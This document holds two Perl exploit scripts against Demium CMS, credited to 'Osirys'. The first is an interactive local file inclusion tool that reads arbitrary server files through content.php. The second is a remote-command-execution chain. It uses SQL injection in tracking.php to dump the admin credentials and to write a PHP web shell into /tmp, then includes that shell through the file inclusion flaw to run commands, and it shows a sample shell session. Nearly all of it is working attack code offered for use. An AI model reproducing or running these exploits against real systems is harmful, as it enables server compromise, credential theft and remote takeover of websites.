#!/usr/bin/perl

# LFI Sploit
# by Osirys

use IO::Socket;

my $host   = $ARGV[0];

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&exploit;

sub exploit () {
    print "\n[*] Include: ";
    chomp($l_file = <STDIN>);

    print "\n";
    $l_file !~ /exit/ || die "Exiting ..";
    if ($l_file !~ /%00^/) {
        $l_file = $l_file."%00";
    }

    my $url = $path."/content.php?include=".$l_file;

    my $data = "GET ".$url." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Cookie: login_user=p0wnin; login_pw=p0wnin\r\n".
               "Content-Length: 0\r\n\r\n".
               "\r\n";

    my $socket   =  new IO::Socket::INET(
                                             PeerAddr => $h0st,
                                             PeerPort => '80',
                                             Proto    => 'tcp',
                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

    $socket->send($data);

    my $count = 0;
    while (my $e = <$socket>) {
        $count++;
        if ($count > 9) {
            chomp($e);
            print "$e\n";
        }
    }

    &exploit;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.+)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub banner {
    print "\n".
          "  --------------------------- \n".
          "     Demium CMS LFI sploit    \n".
          "           by Osirys          \n".
          "  --------------------------- \n\n";
}

sub help () {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

[/$$]







[$$$ - Remote Command Execution Exploit via SQL Injection and Local File Inclusion (Works with mq Off)]

#!/usr/bin/perl

# RCE Exploit
# Step 1 => Creating a remote Shell in /tmp via SQL Injection
# Step 2 => Including via LFI remote Shell, executing your CMDs

# by Giovanni Buzzin, Osirys

# ----------------------------------------------------------------------------
# Exploit in action [>!]
# ----------------------------------------------------------------------------
# osirys[~]>$ perl sp1.txt http://localhost/demium_beta_v.0.2.1/

#   ---------------------------
#      Demium CMS RCE sploit
#            (SQL-LFI)
#            by Osirys
#   ---------------------------

# [*] Getting admin login details ..
# [$] User: admin
# [$] Pass: 5f4dcc3b5aa765d61d8327deb882cf99

# [*] Creating remote Shell via SQL Injection ..
# [*] Spawning remote Shell via LFI ..

# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/demium_beta_v.0.2.1
# shell[localhost]$> exit
# [-] Quitting ..

# osirys[~]>$
# ----------------------------------------------------------------------------

use IO::Socket;
use LWP::UserAgent;

my $host   = $ARGV[0];
my $rand = int(rand 50);

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print "[*] Getting admin login details ..\n";

my $url = $host."/tracking.php?follow_kat=osirys' union select concat(profile_username,0x3a,profile_password) from cms_profile order by '*";
my $re = get_req($url);
if ($re =~ /replace\('\/(.+):(.+)\/.html/) {
    $user = $1;
    $pass = $2;
    print "[\$] User: $user\n";
    print "[\$] Pass: $pass\n";
}
else {
    print "[-] Can't extract admin details\n\n";
}

print "\n[*] Creating remote Shell via SQL Injection ..\n";

my $code = "<?php echo \"0xExec\";system(\$_GET[cmd]);echo \"ExeCx0\" ?>";
my $file = "/tmp/sh_spawn_ownzzzzz".$rand.".txt";
my $attack  = $host."/tracking.php?follow_kat=osirys' union select '".$code."' into outfile '".$file;
get_req($attack);

print "[*] Spawning remote Shell via LFI ..\n\n";
&exploit;

sub exploit {
    my $file = "../../../../../../../../..".$file;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    chomp($cmd = <STDIN>);
    $cmd !~ /exit/ || die "[-] Quitting ..\n\n";

    my $url = $path."/content.php?include=".$file."%00&cmd=".$cmd;

    my $data = "GET ".$url." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Cookie: login_user=p0wnin; login_pw=p0wnin\r\n".
               "Content-Length: 0\r\n\r\n".
               "\r\n";

    my $socket   =  new IO::Socket::INET(
                                             PeerAddr => $h0st,
                                             PeerPort => '80',
                                             Proto    => 'tcp',
                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

    $socket->send($data);

    my @tmp_out;
    my $stop;
    while ((my $e = <$socket>)&&($stop != 1)) {
        if ($e =~ /ExeCx0/) {
            $stop = 1;
        }
        push(@tmp_out,$e);
    }

    $stop == 1 || die "[-] Can't include remote Shell\n\n";

    my $re = join '', @tmp_out;
    my $content = tag($re);
    if ($content =~ /0xExec(.+)\*ExeCx0/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exploit;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exploit;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return($response->content);
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.+)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return($full_det);
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------- \n".
          "     Demium CMS RCE sploit    \n".
          "           (SQL-LFI)          \n".
          "           by Osirys          \n".
          "  --------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

